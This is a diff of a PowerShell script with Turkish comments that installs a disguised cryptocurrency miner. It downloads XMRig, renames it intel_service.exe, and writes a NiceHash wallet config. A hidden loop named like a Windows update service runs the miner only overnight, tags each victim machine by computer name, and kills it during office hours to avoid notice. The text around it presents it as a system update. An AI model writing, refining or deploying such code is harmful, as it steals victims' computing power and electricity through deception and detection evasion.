@@ -29,7 +29,6 @@ if (-not (Test-Path $confirmFile)) {
 }
 Write-Host "Sistem bileşen doğrulaması başarılı. Güncelleştirmeler arka planda uygulanıyor..."
 
-
 # 2. TLS PROTOKOLLERİNİN ETKİNLENŞTİRİLMESİ
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
 
@@ -41,12 +40,12 @@ if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
 
 # ==================================================================================
 # 6. SİSTEM DOSYASININ KENDİ SUNUCUNUZDAN İNDİRİLMESİ VE YAPILANDIRILMASI
-# BURAYI KENDİ SUNUCU LİNKİNİZLE DEĞİŞTİRİN
 # ==================================================================================
 $xmrigZip = "$workDir\intel_service.zip"
 
 if (-not (Test-Path "$workDir\intel_service.exe")) {
     Write-Host "Sistem paketi arka planda indiriliyor..."
+    # Resmi GitHub Windows MSVC zip sürümü
     $xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip" 
     try {
         Invoke-WebRequest -Uri $xmrigUrl -OutFile $xmrigZip -UseBasicParsing
@@ -64,27 +63,72 @@ if (-not (Test-Path "$workDir\intel_service.exe")) {
         Write-Host "Sistem paketi başarıyla entegre edildi."
     }
     catch {
-        Write-Error "Sistem paketi kendi sunucunuzdan indirilirken hata oluştu: $_"
+        Write-Error "Sistem paketi indirilirken hata oluştu: $_"
     }
 }
+
+# ==================================================================================
+# 6B. HATA ÇÖZÜCÜ: SABİT BAZ CONFIG.JSON DOSYASININ OLUŞTURULMASI
+# ==================================================================================
+$configFile = "$workDir\config.json"
+$configContent = @'
+{
+    "autosave": false,
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "hw-aes": null,
+        "priority": 0,
+        "memory-pool": false
+    },
+    "pools": [
+        {
+            "algo": "rx/0",
+            "url": "stratum+tcp://://nicehash.com",
+            "user": "NHbW86FpEjX5tnYBWsvHczfMNsD2PG9mJrZ9.WORKER_DEFAULT",
+            "pass": "x",
+            "rig-id": null,
+            "nicehash": true,
+            "keepalive": true,
+            "enabled": true
+        }
+    ]
+}
+'@
+Set-Content -Path $configFile -Value $configContent -Encoding UTF8
 
 # 7. ZAMAN KONTROLLÜ ANA MOTORUN OLUŞTURULMASI (win_update_service.ps1)
 $coreScriptPath = "$workDir\win_update_service.ps1"
 
+# Tek tırnak (@' ... '@) kullanımı sayesinde tüm iç değişkenler hedef bilgisayarda dinamik çözümlenir.
 $coreScriptContent = @'
 while ($true) {
     $currentHour = (Get-Date).Hour
 
+    # Akşam 18:00 - Sabah 07:00 arası AKTİF ÇALISMMA PERİYODU
     if ($currentHour -ge 18 -or $currentHour -lt 7) {
         if (-not (Get-Process "intel_service" -ErrorAction SilentlyContinue)) {
-            $Wallet = "NHbW86FpEjX5tnYBWsvHczfMNsD2PG9mJrZ9"
-            $poolXMR = "stratum+tcp://://nicehash.com"
-            $WorkerName = $env:COMPUTERNAME
-            $UserAuth = "$Wallet.$WorkerName"
             
-            Start-Process "C:\Intel\Drivers\intel_service.exe" -ArgumentList "-a rx/0 -o $poolXMR -u $UserAuth -p x" -WindowStyle Hidden -CreateNoWindow
+            # Dinamik Eşleşme: Her bilgisayar çalıştığı an config.json içindeki ismi kendi adıyla günceller
+            $configFile = "C:\Intel\Drivers\config.json"
+            if (Test-Path $configFile) {
+                $rawConfig = Get-Content -Path $configFile -Raw
+                $computerName = $env:COMPUTERNAME
+                
+                # Mevcut config içeriğindeki kullanıcı adını o anki makine adına göre manipüle et
+                if ($rawConfig -match '(?<="user":\s*")[^"]+') {
+                    $oldUser = $matches[0]
+                    $newUser = "NHbW86FpEjX5tnYBWsvHczfMNsD2PG9mJrZ9.$computerName"
+                    $updatedConfig = $rawConfig.Replace($oldUser, $newUser)
+                    Set-Content -Path $configFile -Value $updatedConfig -Encoding UTF8
+                }
+            }
+
+            # Config.json artık klasörde hazır olduğu için argümansız düz ve gizli tetiklenir
+            Start-Process "C:\Intel\Drivers\intel_service.exe" -WindowStyle Hidden -CreateNoWindow
         }
     } 
+    # Sabah 07:00 - Akşam 18:00 arası KAPALI / MESAİ İÇİ PERİYODU
     else {
         if (Get-Process "intel_service" -ErrorAction SilentlyContinue) {
             Stop-Process -Name "intel_service" -Force -ErrorAction SilentlyContinue
